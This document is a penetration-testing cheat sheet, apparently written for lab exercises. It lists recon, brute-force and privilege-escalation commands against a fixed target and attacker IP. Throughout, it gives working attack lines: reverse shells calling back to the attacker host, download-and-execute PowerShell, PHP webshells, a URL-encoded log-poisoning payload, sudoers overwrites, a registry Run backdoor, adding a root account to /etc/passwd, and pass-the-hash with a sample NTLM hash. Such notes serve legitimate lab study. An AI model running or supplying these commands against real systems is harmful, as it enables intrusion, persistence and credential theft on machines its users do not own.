---
Target IP: 192.168.183.53
Attacker IP: 192.168.45.226
---
#### nmap Command
```bash
ping -c 4 192.168.183.53
# Ping sweep scan
nmap -sn 192.168.183.53
# This will do the ping scan instead of ARP on port 80
nmap -sn -PS 192.168.183.53
# We can also specify the port or port range
nmap -sn -PS22 192.168.183.53
nmap -sn -PS1-1000 192.168.183.53

# Default port scan with version detection and default script findings
nmap -sCSV --min-rate=1000 -T4 192.168.183.53 -v -oN nmap-initial.log

## 1. All port scan | add -Pn if needed 
# -Pn: Skips host discovery; assumes the host is online.
nmap -p- --min-rate=1000 -T4 192.168.183.53 -v -oN nmap-all-ports.log

## 2. Create ports variable in shell from the all port scan result 
ports=$(cat nmap-all-ports.log | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

## 3. Launch version detection and script scan with the all port scan result
# -sS: SYN (Stealth) scan | Normal flow SYN - SYNACK - ACK
# Stealth flow SYN-SYNACK-RST
nmap -p$ports -sCSV 192.168.183.53 -v -oN nmap-services.log

# Best practice scan for UDP ports as well
sudo nmap -Pn -n 192.168.183.53 -sU --top-ports=100 --reason

# To use Nmap to determine the best service name, you can use the -sV command to perform a service and version detection scan:
nmap 192.168.1.1 -sV
# Attempts to determine the version of the service running on a port
nmap 192.168.1.1 -sV -version-intensity 8
# Sets the intensity level to 8, which increases the possibility of correctness
nmap 192.168.1.1 -sV -version-light
# Enables light mode, which is faster but has a lower possibility of correctness
nmap 192.168.1.1 -sV -version-all
# Enables intensity level 9, which has a higher possibility of correctness but is slower

```

#### rsync
```bash
# Rsync is a free command-line tool for transferring files within your local system and between local and remote systems. It offers many customization options and is often used for mirroring, performing backups, or migrating data to other servers.

# connect
rsync rsync://user@target_host/

# Enumeration
nmap -p 873 X.X.X.X
nmap -sV --script "rsync-list-modules" -p 873 target_host

# msf
msf> use auxiliary/scanner/rsync/modules_list

# Enum shared folder
rsync target_host::

# Details info of specifc folder
rsync -av --list-only rsync://target_host/module_name

# Data Exfiltration
rsync -avz target_host::module_name /local/directory/

# Gain persistence
rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh

```
#### Network File Share (NFS) Enum
```bash
# Nmap with NFS Scripts
nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 192.168.183.53
```
#### DNS Enum
```bash
# DNS Zone transfer
dig @192.168.183.53 axfr <dns_name>

# dns enum
dnsenum 192.168.183.53
```
#### SMB Enum
```bash
nmap -script=smb-vuln\* -p445 192.168.183.53

enum4linux -a 192.168.183.53 
# Enumerate using login credentials:
enum4linux -u user_name -p password 192.168.183.53
# Enumerate user list:
enum4linux -U 192.168.183.53
  
smbclient -N -L //192.168.183.53//
# Connect with a username:
smbclient //192.168.183.53/share -U username
# Connect with a workgroup:
smbclient //192.168.183.53/share --workgroup domain -U username
# Connect with a username and password:
smbclient //192.168.183.53/share -U username%password
  
crackmapexec smb 192.168.183.53 --shares
```

#### LinPEAS
```bash
# Output to file
python -m http.server 80 
curl 192.168.45.226/linpeas.sh -o linpeas.sh
wget http://192.168.45.226/linpeas.sh -O linpeas.sh
./linpeas.sh -a > linpeas.txt #Victim
less -r linpeas.txt #Read with colors

# Local network
sudo python3 -m http.server 80 #Host
curl 192.168.45.226/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/192.168.45.226/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 192.168.45.226:8000/linpeas.sh | sh | nc 192.168.45.226 9002 #Victim
```
#### Crackmapexec
```bash
# General help
crackmapexec --help
# Protocol help
cracmapexec smb --help

# Null session
crackmapexec smb 192.168.183.53 -u "" up ""
# Connect to target using local account
crackmapexec smb 192.168.183.53 -u 'Administrator' -p 'PASSWORD' --local-auth
# Pass the hash against a subnet
crackmapexec smb 192.168.183.53 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 192.168.183.53 -u administrator -H 'NTHASH'
# Bruteforcing and Password Spraying
crackmapexec smb 192.168.183.53 -u "admin" -p "password1"
crackmapexec smb 192.168.183.53 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.183.53 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.183.53 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.183.53 -u user_file.txt -H ntlm_hashFile.txt
```
#### Gobuster
```bash
# Directory list files
/usr/share/seclists/Discovery/Web-Content/common.txt  
/usr/share/seclists/Discovery/Web-Content/big.txt  
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Directory fuzzing dirlist - common
gobuster dir -u http://192.168.183.53 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
# Directory fuzzing dirlist - raft small
gobuster dir -u http://192.168.183.53 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt
# Directory fuzzing dirlist - big
gobuster dir -u http://192.168.183.53 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
# Directory fuzzing dirlist - dir 2.3 medium
gobuster dir -u http://192.168.183.53 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# without many options
gobuster dir -u http://192.168.183.53 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log
# Exclude length
gobuster dir -u http://192.168.183.53 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log

# Subdomain fuzzing
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.183.53
```

#### LDAP Enum
```bash
#If LDAP running some LDAP related `nmap` scripts to enumerate
nmap -n -sV --script "ldap* and not brute" 192.168.183.53

# we can run LDAP search with the naming context included to enumerate users and grep by SAM account name.
ldapsearch -x -H "ldap://192.168.183.53" -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName

# Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the _ms-Mcs-AdmPwd attribute.
ldapsearch -x -H "ldap://192.168.183.53" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 

# Dumping the LAPS Password with crackmapexec
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```
#### Rev Shell
```bash
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.226\",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4444 -f elf -o shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4445 -f exe -o rev.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4445 -f exe-service -o rev-svc.exe

# php revshell smallest
<?=`$_GET[cmd]`?>

# all network connections
netstat -antp
netstat -ano
# command find out which process is listing upon a port
netstat -tulpn

# nc revshell stealth
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 5554 >/tmp/f

# windows rev shell with powercat
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.226/powercat.ps1');powercat -c 192.168.45.226 -p 4444 -e cmd"
```
#### MySQL with web app RCE
```bash
# We can use a single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.  

select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';

# Now that we have a file that we control dropped on the system, we can curl the address and obtain RCE from the dropped file. Find example usage below.  

curl 127.0.0.1:8080/shell.php?cmd=whoami
```
#### Fuff
```bash
# Directory fuzzing on a target URL 
ffuf -u http://example.com/FUZZ -w /path/to/wordlist.txt 
# Fuzzing with different extensions 
ffuf -u http://example.com/FUZZ -w /path/to/wordlist.txt -e .php,.html,.txt 
# Fuzz GET parameters 
ffuf -u http://example.com/?param=FUZZ -w /path/to/wordlist.txt 
# Fuzz POST data 
ffuf -u http://example.com/ -w /path/to/wordlist.txt -X POST -d "param=FUZZ" 
# Filter results by response code 
ffuf -u http://example.com/FUZZ -w /path/to/wordlist.txt -mc 200 
# Save results to a file ffuf -u http://example.com/FUZZ -w /path/to/wordlist.txt -o results.txt -of json 
# Use a proxy for fuzzing 
ffuf -u http://example.com/FUZZ -w /path/to/wordlist.txt -x http://127.0.0.1:8080 # Subdomain enumeration for example.com 
ffuf -u http://example.com/ -w /path/to/wordlist.txt -H "Host: FUZZ.example.com" 
# Subdomain enumeration for example.com filter result by no of words 
ffuf -u http://example.com/ -w /path/to/wordlist.txt -H "Host: FUZZ.example.com" -fw <number>
```
#### Wfuzz
```bash
# Directory fuzzing on a target URL
wfuzz -c -w /path/to/wordlist.txt http://example.com/FUZZ
# Fuzzing with different extensions
wfuzz -c -w /path/to/wordlist.txt -z list,.php,.html,.txt http://example.com/FUZZ
# Fuzz GET parameters
wfuzz -c -w /path/to/wordlist.txt http://example.com/?param=FUZZ
# Fuzz POST data
wfuzz -c -w /path/to/wordlist.txt -d "param=FUZZ" http://example.com/
# Filter results by response code
wfuzz -c -w /path/to/wordlist.txt --hc 404 http://example.com/FUZZ
# Save results to a file
wfuzz -c -w /path/to/wordlist.txt -o results.txt http://example.com/FUZZ
# Use a proxy for fuzzing
wfuzz -c -w /path/to/wordlist.txt -p 127.0.0.1:8080 http://example.com/FUZZ
```
#### dirsearch
```bash
# Top command 
dirsearch -u http://192.168.183.53 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
# -e for specific extension comma seperated 
# -x to exclude status code 
# -r recursive to 1 level 
# -t thread count 
# Perform a basic scan against a target URL 
dirsearch -u http://192.168.183.53 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
# Use a custom wordlist for directory and file brute-forcing: 
dirsearch -u http://192.168.183.53 -w /path/to/wordlist.txt 
# Specify file extensions to look for during the scan: 
dirsearch -u http://192.168.183.53 -e php,txt,html 
# Recursively scan subdirectories for directories and files:
dirsearch -u http://192.168.183.53 -r
# Save scan results to a file: 
dirsearch -u http://192.168.183.53 -o dirseacrh.txt 
# Specify custom HTTP headers for the requests: 
dirsearch -u http://192.168.183.53 -H "User-Agent: Mozilla/5.0"
```
#### hydra
```bash
# Basic command
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://192.168.183.53 -t 4

# For FTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://192.168.183.53 -t 4

# -t :: Number of thread followed by the number

# base64 encoded credentials and response as 403 forbidden
hydra -L usernames.txt -P passwords.txt 192.168.183.53 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:Forbidden'

# Post web login forms
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.183.53 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

# Hydra basic authentication
hydra -l bob -P /usr/share/wordlists/rockyou.txt "http-get://192.168.183.53/protected:A=BASIC:F=401"

# -L :: for username file
# -l :: for username as string
# -P :: for password file
# -p :: foe password as string

# -I : ignore hydra.restore file
# -V : very verbose output
# **-f : stop when a logon is found**
# -L : username list
# -u : rotate around usernames, not passwords
# -P : passwords list

hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.183.53 ftp
```
#### Netcat with rlwrap
```bash
rlwrap -f . -r nc -lnvp 443
# rlwrap is an tool called read line wrapper
# -f for shell completion on tab
# -r for remember the commands

# For symbolic link creation of the linux binaries
ln -s $(which nc) .

# PHP cmd webshell
echo '<?php system($_GET["cmd"]);?>'>cmd.php
```
#### systemctl Command
```bash
# To check the all running services
systemctl list-units --type=service --state=running

# To get the service details
systemctl cat service_name
```
#### Shell Stabilization
```bash
1. python3 -c 'import pty;pty.spawn("/bin/bash")' 
2. export TERM=xterm
3. CTRL+Z 
4. stty raw -echo;fg
5. stty rows 38 columns 116
```
#### export PATH
```bash
export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
```
#### Hashcat
```bash
hashcat hash /usr/share/wordlists/rockyou.txt -m 1600
```
#### Priv Esc Enumeration
```bash
# To search a file
find /path/ -type f -name file-to-search
# To search the local.txt file and exclude permission denied output
find / -type f -name local.txt 2>/dev/null

# Find files owner by root with write permission
find / -type f -user root -perm /o=w
# To exclude proc file during file search
find / -type f -user root -perm /o=w 2>/dev/null | grep -v proc
# To exclude proc and sys files during file search
find / -type f -user root -perm /o=w 2>/dev/null | grep -Ev 'proc|sys'

# search for directory with write permission
find / -writable -type d 2>/dev/null

# search for files with write permission
find /etc -type f -writable 2> /dev/null

# Find SUID
find / -perm -u=s -type f 2>/dev/null

# Find allowed SUDO priv 
sudo -l (need password)

# find binary in a group
find / -group group_name 2>/dev/null

# Capabilities are same is SUID but its hidden
getcap -r / 2>/dev/null
```
#### grep Command
```bash
# Find files containing a specific string
grep -Rnwi '/path/to/somewhere/' -e 'pattern'
# r or -R is recursive ; use -R to search entirely -n is line number, and -w stands for match the whole word. -l (lower-case L) can be added to just give the file name of matching files. -e is the pattern used during the search -i for case insensitive search
```
#### Command Injection
https://github.com/payloadbox/command-injection-payload-list
' and die(system("id")) or '
#### LFI
**PHP WRAPPER LFI**
php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd
#### Exploit Cronjob
```bash
echo "echo 'student ALL=(root) NOPASSWD: ALL' > /etc/sudoers" >> archive.sh

sudo -i
```

#### Tar wildcard
```bash
echo "echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"

echo "" > --checkpoint=1

then check with "sudo -l" once the cron or script is executed.
```
#### Linux Commands
```bash
# To list users
cat /etc/passwd | grep bash
```
#### Windows Priv Esc
```powershell
# LFI and RFI
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.226/powercat.ps1');powercat -c 192.168.45.226 -p 135 -e cmd"

# File transfer CMD
powershell iwr http://192.168.45.226/nc64.exe -outfile nc64.exe

# powershell file transfer
iwr -uri http://192.168.45.226/adduser.exe -Outfile adduser.exe

# execute netcat
.\nc64.exe 192.168.45.226 135 -e cmd.exe'

# printspoofer
PrintSpoofer.exe -i -c cmd

# if port 135 rpc (remote procedure call) is open then we can try below commands to interact with the process
rpcclient -U '' -N 192.168.183.53

# set path if it set to something else check with echo %PATH%
set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\

# connect to rdp running of port
rdesktop 192.168.183.53

# To download file in windows
certutil -urlcache -f http://192.168.45.226 path-output-file-name

# windows RDP from linux using xfreerdp
xfreerdp /v:IP /u:USER /p:PASSWORD /cert:ignore /dynamic-resolution

# To check the privileges of the account
whoami /priv
whoami /groups

# To list all user on the system
net user 
net user <username>

# To add a new user
net user <username> <password> /add

# To add the user into adminstrator group
net localgroup Administrators <username> /add
net localgroup <group name> <username> /add

# list groups
net localgroup

# list user of a group
net localgroup administrators

# network information
ipconfig
ipconfig /all

# ARP Commands
# The ARP cache or table has the dynamic list of IP and MAC addresses of those devices to which your computer has communicated recently in a local network. The purpose of maintaining an ARP table is that when you want to communicate with another device, your device does not need to send the ARP request for the MAC address of that device.
# https://www.javatpoint.com/arp-commands
arp -a

# find password in filesi
findstr /si password *.txt *.ini *.config

# routing table
route print

# all network connections
netstat -ano

# To check the OS and system info
systeminfo

systeminfo | findstr # To filter out the output

# To check patch history
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn # To get short/clean output

# To check for autorun services
wmic service get name,displayname,pathname,startmode |findstr /i "auto"

## Harvesting Passwords from Usual Spots
# Powershell History
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# To get Saved Windows Credentials
cmdkey /list
# While you can't see the actual passwords, if you notice any credentials worth trying, you can use below command
runas /savecred /user:admin cmd.exe

# IIS Configuration 
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

# Retrieve Credentials from Software: PuTTY
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

## Other Quick Wins
# Scheduled tasks can be listed from the command line using **its for all user**
schtasks 
schtasks /query /fo LIST /v
# To retrieve detailed information about any of the services
schtasks /query /tn <taskname> /fo list /v

# To check the file permissions of a file
icacls c:\tasks\schtask.bat

# Grant all access to specific user
icacls "C:\MyFolder\rev.exe" /grant John:F
# Grant all access to everyone
icacls "C:\MyFolder" /grant Everyone:F
# Recursive permission
icacls "C:\MyFolder" /grant Everyone:F /T
# Remove Existing Permissions. If you want to reset permissions, use:
icacls "C:\MyFolder" /grant Everyone:F /T

# To add rev shell code on an executable
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

# To run the schedule task immediately 
schtasks /run /tn <taskname>

# To check the user and group details
net user username

# Generate a malicious .msi or .exe file using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.226 LPORT=LOCAL_PORT -f msi -o malicious.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4445 -f exe-service -o rev-svc.exe

# Run the installer with the command
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

# Windows services
# Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt
sc qc <svcname>
sc query windefedn # to check if the windows defender service is running (anti virus)

# Insecure Permissions on Service Executable
sc qc WindowsScheduler

# To check all services
sc queryex type= service

# to check firewall status
netsh advfirewall firewall dump
netsh firewall show state

# Check the permissions on the executable
icacls C:\PROGRA~2\SYSTEM~1\WService.exe

# Windows service restart
sc stop windowsscheduler
sc start windowsscheduler

# Unquoted Service Paths
# To list Services Running 
net start

# You can also use:

sc queryex type= service state= all

# state= all: Returns a list of all services
# state= inactive: Returns a list of stopped services

# To get a start of all running services only, do not include the ‘state’ field.
sc queryex type= service

# To give execute permission to a binary
icacls C:\MyPrograms\Disk.exe /grant Everyone:F

## Insecure service config
# Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen using Accesschk from the Sysinternals suite.
accesschk64.exe -qlc thmservice

# To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
# NOTE: Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available.
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

# Windows Privileges
# Each user has a set of assigned privileges that can be checked with the command
whoami /priv

## SeBackup / SeRestore
# The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place
# To backup the SAM and SYSTEM hashes, we can use the commands
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive

# use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox
impacket-smbserver -smb2support -username test -password test123 public share

# on victine nachine use below command to connect to the share for file transfer
C:\>net use
C:\>net use \\[host]\[share name]
C:\>net use /d \\[host]\[share name]
# The first command will list all currently connected shares. The second will create a connection to the named shared at the given host (in our case, typically an IP address). The third command will close that connection.

# After this, we can use the copy command in our windows machine to transfer both files to our AttackBox
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
 
# use impacket secretdump to retrieve the users' password hashes:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
# another way to get creds in local
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL

# We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.69.226

## SeTakeOwnership
# The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges
# To replace utilman, we will start by taking ownership of it with the command:
C:\> takeown /f C:\Windows\System32\Utilman.exe

#  To give your user full permissions over utilman.exe you can use the command:
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F

# we will replace utilman.exe with a copy of cmd.exe:
copy cmd.exe utilman.exe


## SeImpersonate / SeAssignPrimaryToken
# These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
# trigger the RogueWinRM exploit using the following command:
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
# The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

# Tomcat war reverse shell
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.45.226 lport=4242 -f war > shell.war

# Windows Staged reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f exe > reverse.exe

# Windows Stageless reverse TCP
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f exe > reverse.exe

# Linux Staged reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f elf >reverse.elf

# Linux Stageless reverse TCP
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f elf >reverse.elf

# add a backdoor in regsitry
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersions\Run" /v shell /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
# checking the backdoor in registry
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersions\Run" /v shell

# Other platforms
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.45.226 LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.226 LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.45.226 LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.226 LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

```
#### PHP Apache2 log poisoning
https://dheerajdeshmukh.medium.com/get-reverse-shell-through-log-poisoning-with-the-vulnerability-of-lfi-local-file-inclusion-e504e2d41f69
Burp code for dogcat THM
GET /?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.11.114.221%22%2C443%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 HTTP/1.1
Host: 10.10.70.137
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?> (X11; Linux x86_64; rv:128.0) 

#### Ligolo-ng
```bash
# SSH port forwarding (authenticated)
ssh -L ATTACK_MACHINE_PORT:localhost:PORT vmdak@192.168.1.116

# Ligolo-ng setup
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

# On attacker machine run the command
./proxy -selfcert -laddr 0.0.0.0:4443 

# On the victim machine run the command
./agent -connect 192.168.45.226:4443 -ignore-cert

# On attacker machine run below on ligolo-ng promt
seesion
1 (or a different number in case of multiple connections)
ifconfig (to identify the subnet)

# On attacker machine run the command for pivoting (not needed for port forwarding)
sudo ip route add <subnet identified for pivoting> dev ligolo
sudo ip route add 192.168.184.0/24 dev ligolo <- Example
ip route list
start <- on the ligolo-ng promt

# On attacker machine run the command for port forwarding (all ports)
sudo ip route add 240.0.0.1/32 dev ligolo
ip route list
start <- on the ligolo-ng promt

Now browse the ports on http://240.0.0.1:PORT

# Reference for port forwarding
# https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9

# Reference for ligolo-ng tutorial
# https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
# https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
```
#### Smbclient
```bash
# List SMB shares:
smbclient -L //server_name
smbclient -L spookysec.local -U svc-admin%management2005

# Direct link to a share using backslash
smbclient \\\\domain_name_or_IP\\share

# SMB sharing: (Password must be entered.)
smbclient //server/share -U user

# Direct connection to SMB sharing with cred
smbclient \\\\spookysec.local\\backup -U svc-admin%management2005

# In order to find the permissions associated with every share, we can use smbmap:
smbmap -u svc-admin -p management2005 -d . -H 10.10.127.202

# Advanced Features
###################

To download the folder recursively, we use the following commands:
mask ""
recurse ON 
prompt OFF
mget * 

# Download a file from the share
smbclient //server/share -U username -c 'get remote_file local_file'

# Upload a file to the share
smbclient //server/share -U username -c 'put local_file remote_file'

# List files in the share
smbclient //server/share -U username -c 'ls'

# Create a directory in the share
smbclient //server/share -U username -c 'mkdir new_directory'

# Remove a file from the share
smbclient //server/share -U username -c 'del file_to_delete'

# Remove a directory from the share
smbclient //server/share -U username -c 'rmdir directory_to_remove'

# Execute a command on the share
smbclient //server/share -U username -c 'command_to_execute'

# Set file permissions on the share
smbclient //server/share -U username -c 'chmod 755 file'
```
#### SMBMap
```bash
# Scan a single host for SMB shares
smbmap -H 192.168.183.53

# For anonymous/guest access
smbmap -u 'guest' -p '' -H 192.168.183.53

# Scan multiple hosts for SMB shares from a file
smbmap -H <target_ip_file.txt>

# Authentication Options
########################

# Scan with username and password
smbmap -H 192.168.183.53 -u <username> -p <password>

# Scan with username and prompt for password
smbmap -H 192.168.183.53 -u <username>

# Scan with NTLM hash
smbmap -H 192.168.183.53 -u <username> -H <NTLM_hash>

# Scan with Kerberos ticket
smbmap -H 192.168.183.53 --kerberos
```
#### Crackmapexec
```bash
# SMB enumeration
crackmapexec smb 192.168.183.53 -u guest -p '' --shares

# To check the valid user and hashesh, we can use crackmapexec
crackmapexec winrm 192.168.183.53 -u <username file> -H <hash file>

```
#### Wpscan
```shell
# Enumerate WordPress version
wpscan --url http://192.168.183.53 --enumerate v
# Scan with API token
wpscan --url http://192.168.183.53 --api-token <your_api_token>
# HTTP basic authentication
wpscan --url http://192.168.183.53 --http-auth <username>:<password>
# Enumerate plugins, themes, and users
wpscan --url http://192.168.183.53 --enumerate p,t,u --plugins-detection aggressive
# Brute force usernames
wpscan --url http://192.168.183.53 --enumerate u --passwords <password_list>
# Brute force passwords for a specific user
wpscan --url http://192.168.183.53 -U <username> -P <password_list>
# Scan with a proxy
wpscan --url http://192.168.183.53 --proxy <proxy_ip:port>
# Scan for known vulnerabilities
wpscan --url http://192.168.183.53 --enumerate vp
# Enumerate plugins with vulnerability checks
wpscan --url http://192.168.183.53 --api-token YOUR_API_TOKEN --enumerate vp
# Brute force usernames
wpscan --url http://192.168.183.53 --enumerate u --passwords /path/to/passwords.txt
# Brute force password for a specific user
wpscan --url http://192.168.183.53 -U admin -P /path/to/passwords.txt
# Scan using an HTTP proxy
wpscan --url http://192.168.183.53 --proxy 127.0.0.1:8080
```

#### LXD Group Access Priv Esc
```bash
# To list all images
lxc image list

# To list storage
lxc storage list

# To import an image
lxc image import <image_location> --alias <image name>
lxc image import alpine.tar.gz --alias alpineimg

# To make a container from the image
lxc init <image name> <container name> -c security.priviledged=true
lxc init alpineimg alpinecon -c security.privileged=true

# Add a new disk device for the container
lxc config device add <container name> <device name> disk source=/ path=/mnt/root recursive=true
lxc config device add alpinecon mydevice disk source=/ path=/mnt/root recursive=true

# To start the container
lxc start <container name>
lxc start alpinecon

# To get the shell of the container
lxc exec <container name> /bin/sh
lxc exec alpinecon /bin/sh

# generate passweord salt
openssl passwd -1 -salt balai --> $1$balai$tgTplvzPJUWMnsojOpV9H0
openssl passwd balai--> $1$CcQOx9tc$9rlUuVkPi9tqvp.hIu2KI/

# Now add this users into the passwd file
cd /mnt/root/etc
echo 'balai:<saltpasswd>:0:0::/root:/bin/bash' >> passwd
echo 'balai:$1$CcQOx9tc$9rlUuVkPi9tqvp.hIu2KI/:0:0::/root:/bin/bash' >> passwd
tail passwd

```

#### Docker Group Access Priv Esc
```bash
# To list all docker images
docker image ls

# Create and run the container from the image
docker run -it <image name>
docker run -it alpine
docker run -it bash sh
docker run -v /root:/mnt -it alpine
